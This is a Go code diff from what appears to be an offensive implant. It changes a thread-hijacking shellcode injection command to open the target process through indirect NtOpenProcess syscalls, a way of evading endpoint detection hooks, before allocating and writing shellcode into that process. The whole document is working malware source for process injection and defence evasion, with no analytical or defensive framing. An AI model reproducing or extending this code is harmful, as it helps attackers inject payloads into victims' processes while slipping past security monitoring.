@@ -126,6 +126,7 @@ func (c *ThreadHijackCommand) Execute(task structs.Task) structs.CommandResult {
 // performThreadHijack executes the thread hijacking injection pipeline
 func performThreadHijack(shellcode []byte, pid, tid uint32) (string, error) {
 	var sb strings.Builder
+	var err error
 
 	sb.WriteString("[*] Thread Hijack Injection starting\n")
 	sb.WriteString(fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode)))
@@ -134,15 +135,25 @@ func performThreadHijack(shellcode []byte, pid, tid uint32) (string, error) {
 	// Step 1: Open target process
 	desiredAccess := uint32(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
 		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
-	hProcess, err := injectOpenProcess(desiredAccess, pid)
-	if err != nil {
-		return sb.String(), fmt.Errorf("failed to open process: %v", err)
+	var hProcess uintptr
+	if IndirectSyscallsAvailable() {
+		sb.WriteString("[*] Using indirect syscalls\n")
+		status := IndirectNtOpenProcess(&hProcess, desiredAccess, uintptr(pid))
+		if status != 0 {
+			return sb.String(), fmt.Errorf("NtOpenProcess failed: NTSTATUS 0x%X", status)
+		}
+	} else {
+		hProcess, _, err = procOpenProcess.Call(uintptr(desiredAccess), 0, uintptr(pid))
+		if hProcess == 0 {
+			return sb.String(), fmt.Errorf("OpenProcess failed: %v", err)
+		}
 	}
 	defer injectCloseHandle(hProcess)
 	sb.WriteString(fmt.Sprintf("[+] Opened process handle: 0x%X\n", hProcess))
 
 	// Step 2: Allocate + write shellcode with W^X pattern (RW → RX)
-	scAddr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
+	var scAddr uintptr
+	scAddr, err = injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
 	if err != nil {
 		return sb.String(), fmt.Errorf("failed to inject shellcode: %v", err)
 	}
